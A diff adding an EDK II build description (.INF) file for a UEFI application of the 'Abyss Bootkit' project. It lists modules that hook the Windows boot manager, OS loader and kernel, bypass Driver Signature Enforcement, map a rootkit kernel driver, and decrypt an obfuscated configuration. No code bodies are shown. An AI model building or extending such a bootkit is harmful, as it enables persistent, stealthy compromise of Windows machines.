@@ -1,0 +1,175 @@
+# .INF File
+# https://github.com/tianocore/tianocore.github.io/wiki/Build-Description-Files#the-inf-file
+# This file describes how to build a module (i.e. a driver, library, application, etc…).
+
+# UEFI Application
+
+
+[Defines]
+	INF_VERSION						= 1.25                                      # Defines the version of the EDK II INF specification the INF file supports.
+	BASE_NAME						= AbyssBootkit1UEFIApplication              # Defines the base output name of the module (application, library, etc...) when built resulting in the final .efi or .lib binary.
+	FILE_GUID						= 72a811c1-337b-40e0-9caa-2c0873ccd982      # A unique GUID for this module. See http://www.guidgen.com/
+	MODULE_TYPE						= UEFI_APPLICATION                          # The type of module being built. This includes things such as UEFI_DRIVER, UEFI_APPLICATION, DXE_DRIVER, etc… For libraries it can be BASE, USER_DEFINED, etc…
+	VERSION_STRING					= 1.00                                      # The developer defined version of your module, Major "." Minor number.
+	ENTRY_POINT						= UefiMain                                  # If your module is not a library, this variable defines the function to begin execution. This is similar to the main() function in C.
+
+
+# List the various packages the module will use. This tells the build system where to look for library classes (header files for the library), PCDs, GUIDs, Protocols, and PPIs via the different packages .DEC files. The .DCS file from this package is not used. Typically minimum required package is the MdePkg.dec
+[Packages]
+	MdeModulePkg/MdeModulePkg.dec                                               # This package provides the modules that conform to UEFI/PI Industry standards. It also provides the defintions(including PPIs/PROTOCOLs/GUIDs and library classes) and libraries instances, which are used for those modules.
+		# https://github.com/tianocore/edk2/blob/master/MdeModulePkg/MdeModulePkg.dec
+	MdePkg/MdePkg.dec                                                           # The Module Development Environment Package (MdePkg) is a special package as it is the minimum infrastructure required to build a module
+		# https://github.com/tianocore/edk2/blob/master/MdePkg/MdePkg.dec
+	CryptoPkg/CryptoPkg.dec                                                     # Package for cryptography modules. This Package provides cryptographic-related libraries for UEFI security modules. It also provides a test application to test libraries.
+		# https://github.com/tianocore/edk2/blob/master/CryptoPkg/CryptoPkg.dec
+	ShellPkg/ShellPkg.dec                                                       # This Package provides all definitions for EFI and UEFI Shell
+		# https://github.com/tianocore/edk2/blob/master/ShellPkg/ShellPkg.dec
+	AbyssBootkitPkg/AbyssBootkitPkg.dec                                         # Main package for the Abyss Bootkit project
+
+
+# List the various source and header files used to build the module.
+[Sources]
+	# UEFI Application
+	AbyssBootkit1UEFIApplication.c                                                                                  # Main
+
+	# Pre Boot Configuration
+	Modules/Module0_PreBoot0_Configuration/Functions/Functions00Configuration.c                                     # Configuration
+	Modules/Module0_PreBoot0_Configuration/Functions/Utils/Utils00Debug.c                                           # Debug
+	Modules/Module0_PreBoot0_Configuration/Functions/Utils/Utils01Files.c                                           # Files
+	Modules/Module0_PreBoot0_Configuration/Payloads/Payloads00DefaultEncryptedConfiguration.c                       # Encrypted Configuration
+	Modules/Module0_PreBoot0_Configuration/Functions/Utils/Utils02Deobfuscate.c                                     # Obfuscate
+	Modules/Module0_PreBoot0_Configuration/Functions/Utils/Utils03Decrypt.c                                         # Decrypt
+	Modules/Module0_PreBoot0_Configuration/Functions/Utils/Utils04Json.c                                            # Json
+
+	# Pre Boot Setup
+	Modules/Module0_PreBoot1_Setup/Functions/Functions00Setup.c                                                     # Set Up
+	Modules/Module0_PreBoot1_Setup/Functions/Utils/Utils00Screen.c                                                  # Screen
+	Modules/Module0_PreBoot1_Setup/Functions/Utils/Utils01Banner.c                                                  # Banner
+	Modules/Module0_PreBoot1_Setup/Functions/Utils/Utils02Files.c                                                   # Files
+	Modules/Module0_PreBoot1_Setup/Functions/Utils/Utils03Http.c                                                    # Http
+	Modules/Module0_PreBoot1_Setup/Functions/Utils/Utils04Ntfs.c                                                    # Ntfs
+
+	# Boot Windows Hookings
+	Modules/Module1_BootWindows0_Hookings/Functions/Functions00PatchHookUefi.c                                      # Patch Hook Uefi
+	Modules/Module1_BootWindows0_Hookings/Functions/Utils/Utils00Debug.c                                            # Debug
+	Modules/Module1_BootWindows0_Hookings/Functions/Utils/Utils01Strings.c                                          # Strings
+	Modules/Module1_BootWindows0_Hookings/Functions/Utils/Utils02Registers.c                                        # Registers
+	Modules/Module1_BootWindows0_Hookings/Functions/Utils/Utils03Memory.c                                           # Memory
+	Modules/Module1_BootWindows0_Hookings/Functions/Utils/Utils04Headers.c                                          # Headers
+	Modules/Module1_BootWindows0_Hookings/Functions/Utils/Utils05Pattern.c                                          # Pattern
+	Modules/Module1_BootWindows0_Hookings/Functions/Utils/Utils06Address.c                                          # Address
+	Modules/Module1_BootWindows0_Hookings/Functions/Utils/Utils07PortableExecutable.c                               # Portable Executable
+	Modules/Module1_BootWindows0_Hookings/Functions/Utils/Utils08Tables.c                                           # Tables
+	Modules/Module1_BootWindows0_Hookings/Functions/Utils/Utils09Hooks.c                                            # Hooks
+	Modules/Module1_BootWindows0_Hookings/Functions/Utils/Utils11KernelModeDriverMapper.c                           # Rootkit Mapper
+	Modules/Module1_BootWindows0_Hookings/Payloads/Payloads00KernelModeDriver.c                                     # Kernel Mode Driver (Rootkit)
+	Modules/Module1_BootWindows0_Hookings/Functions/Hooks/Hooks01BootmgfwEfi1ImgArchStartBootApplication.c          # ImgArchStartBootApplication
+	Modules/Module1_BootWindows0_Hookings/Functions/Functions01PatchHookWindowsBootManager.c                        # Patch Hook Windows Boot Manager (bootmgfw.efi)
+	Modules/Module1_BootWindows0_Hookings/Functions/Hooks/Hooks02WinloadEfi1OslFwpKernelSetupPhase1.c               # OslFwpKernelSetupPhase1
+	Modules/Module1_BootWindows0_Hookings/Functions/Hooks/Hooks02WinloadEfi2BlImgAllocateImageBuffer.c              # ImgAllocateImageBuffer
+	Modules/Module1_BootWindows0_Hookings/Functions/Functions02PatchHookWindowsOSLoader.c                           # Patch Hook Windows OS Loader (winload.efi)
+	Modules/Module1_BootWindows0_Hookings/Includes/Zydis/src/Decoder.c                                              # https://github.com/zyantific/zydis/tree/master/src/Decoder.c
+	Modules/Module1_BootWindows0_Hookings/Includes/Zydis/src/DecoderData.c                                          # https://github.com/zyantific/zydis/tree/master/src/DecoderData.c
+	Modules/Module1_BootWindows0_Hookings/Includes/Zydis/src/MetaInfo.c                                             # https://github.com/zyantific/zydis/tree/master/src/MetaInfo.c
+	Modules/Module1_BootWindows0_Hookings/Includes/Zydis/src/Mnemonic.c                                             # https://github.com/zyantific/zydis/tree/master/src/Mnemonic.c
+	Modules/Module1_BootWindows0_Hookings/Includes/Zydis/src/Register.c                                             # https://github.com/zyantific/zydis/tree/master/src/Register.c
+	Modules/Module1_BootWindows0_Hookings/Includes/Zydis/src/Segment.c                                              # https://github.com/zyantific/zydis/tree/master/src/Segment.c
+	Modules/Module1_BootWindows0_Hookings/Includes/Zydis/src/SharedData.c                                           # https://github.com/zyantific/zydis/tree/master/src/SharedData.c
+	Modules/Module1_BootWindows0_Hookings/Includes/Zydis/src/String.c                                               # https://github.com/zyantific/zydis/tree/master/src/String.c
+	Modules/Module1_BootWindows0_Hookings/Includes/Zydis/src/Utils.c                                                # https://github.com/zyantific/zydis/tree/master/src/Utils.c
+	Modules/Module1_BootWindows0_Hookings/Includes/Zydis/src/Zydis.c                                                # https://github.com/zyantific/zydis/tree/master/src/Zydis.c
+	Modules/Module1_BootWindows0_Hookings/Functions/Protections/Protections01DriverSignatureEnforcement.c           # Driver Signature Enforcement (DSE)
+	Modules/Module1_BootWindows0_Hookings/Functions/Functions03PatchHookWindowsKernel.c                             # Patch Hook Windows Kernel (ntoskrnl.exe)
+
+	# Boot Booting
+	Modules/Module2_BootOs0_Booting/Functions/Functions00Booting.c                                                  # Booting
+	Modules/Module2_BootOs0_Booting/Functions/Utils/Utils00EFISystemPartition.c                                     # EFI System Partition
+
+
+# List the various libraries the module uses and should be linked with. This is the LibNameToReference value the library module used in its .INF file. For each entry in this section there needs to be an entry [LibraryClasses] sector of the .DSC file this module is associated with. This is because the packages in the [Packages] section are not used to determine the library module to link with.
+[LibraryClasses]
+	# Entry Point
+	UefiApplicationEntryPoint
+		# Module entry point library for UEFI Applications.
+		# https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Library/UefiApplicationEntryPoint.h
+	# Tables
+	UefiBootServicesTableLib
+		# Provides a service to retrieve a pointer to the EFI Boot Services Table. Only available to DXE and UEFI module types.
+		# https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Library/UefiBootServicesTableLib.h
+	# Base
+	UefiLib
+		# Provides library functions for common UEFI operations. Only available to DXE and UEFI module types.
+		# https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Library/UefiLib.h
+	# Memory
+	BaseMemoryLib|MdePkg/Library/BaseMemoryLib/BaseMemoryLib.inf
+		# Provides copy memory, fill memory, zero memory, and GUID functions.
+		# https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Library/BaseMemoryLib.h
+	MemoryAllocationLib|MdePkg/Library/UefiMemoryAllocationLib/UefiMemoryAllocationLib.inf
+		# Provides services to allocate and free memory buffers of various memory types and alignments.
+		# https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Library/MemoryAllocationLib.h
+	# Files
+	DevicePathLib
+		# Provides library functions to construct and parse UEFI Device Paths.
+		# https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Library/DevicePathLib.h
+	FileHandleLib
+		# Provides interface to EFI_FILE_HANDLE functionality.
+		# https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Library/FileHandleLib.h
+	# Cipher
+	BaseCryptLib
+		# Defines base cryptographic library APIs. The Base Cryptographic Library provides implementations of basic cryptography primitives (Hash Serials, HMAC, RSA, Diffie-Hellman, etc) for UEFI security functionality enabling.
+		# https://github.com/tianocore/edk2/blob/master/CryptoPkg/Include/Library/BaseCryptLib.h
+	OpensslLib
+		# This module provides OpenSSL Library implementation with TLS features.
+		# https://github.com/tianocore/edk2/blob/master/CryptoPkg/Library/OpensslLib/OpensslLib.inf
+	# Shell
+	UefiHiiServicesLib
+		# UEFI HII Services Library implementation.
+		# https://github.com/tianocore/edk2/blob/master/MdeModulePkg/Library/UefiHiiServicesLib/UefiHiiServicesLib.inf
+	SortLib
+		# Library used for sorting routines.
+		# https://github.com/tianocore/edk2/blob/master/MdeModulePkg/Library/UefiSortLib/UefiSortLib.inf
+	HiiLib
+		# HII Library implementation using UEFI HII protocols and services.
+		# https://github.com/tianocore/edk2/blob/master/MdeModulePkg/Library/UefiHiiLib/UefiHiiLib.inf
+	ShellLib
+		# Provides interface to shell functionality for shell commands and applications.
+		# https://github.com/tianocore/edk2/blob/master/ShellPkg/Library/UefiShellLib/UefiShellLib.inf
+
+
+# List the various protocol GUIDs variable name needed/used by the sources. The variable name is defined in one of the [Packages].DEC [Guids] section. Also listed are the Usage Block definitions for the protocol for this module.
+[Protocols]
+	gEfiLoadedImageProtocolGuid                                                 ## CONSUMES
+		# https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Protocol/LoadedImage.h
+	gEfiSimpleFileSystemProtocolGuid                                            ## CONSUMES
+		# https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Protocol/SimpleFileSystem.h
+	gEfiHttpServiceBindingProtocolGuid                                          ## CONSUMES
+		# https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Protocol/ServiceBinding.h
+	gEfiHttpProtocolGuid                                                        ## CONSUMES
+		# https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Protocol/Http.h
+	#gEfiShellEnvironment2Guid                                                  ## CONSUMES
+	#gEfiShellProtocolGuid                                                      ## CONSUMES
+		# https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Protocol/Shell.h
+	#gEfiBlockIoProtocolGuid                                                    ## CONSUMES
+		# https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Protocol/BlockIo.h
+
+
+# List the various GUIDs variable name needed/used by the sources. The variable name is defined in one of the [Packages].DEC [Guids] section. The usage block SOMETIMES_PRODUCES and guide type UNDEFINED Means that the module will produce a GUID that does not fit into the defined PROTOCOL or PPI types. This module conditionally produces the named GUID.
+[Guids]
+	gEfiGlobalVariableGuid                                                      ## SOMETIMES_PRODUCES
+		# https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Guid/GlobalVariable.h
+	gEfiEventExitBootServicesGuid                                               ## CONSUMES
+		# https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Guid/EventGroup.h
+
+
+# Add compiler specific options needed to build the module.
+[BuildOptions]
+	# Solve Warning: AbyssBootkitPkg\Bootkit1_Boot_UEFIApplication\Modules\Module1_BootWindows0_Hookings\Includes\zydis\include\Zydis/DecoderTypes.h(266): warning C4201: nonstandard extension used: nameless struct/union
+	
+	# Define preprocessor macros to disable certain features in Zydis
+	*_*_*_CC_FLAGS = -D ZYAN_NO_LIBC -D ZYCORE_STATIC_BUILD -D ZYDIS_STATIC_BUILD -D ZYDIS_DISABLE_ENCODER -D ZYDIS_DISABLE_FORMATTER -D ZYDIS_DISABLE_AVX512 -D ZYDIS_DISABLE_KNC
+
+	# Suppress warning C4201 (nameless struct/union) for Microsoft Visual Studio compiler
+	MSFT:*_*_*_CC_FLAGS = /wd4201
+
+	# Suppress warning C4201 (nameless struct/union) for Intel C++ Compiler
+	INTEL:*_*_*_CC_FLAGS = -wd4201
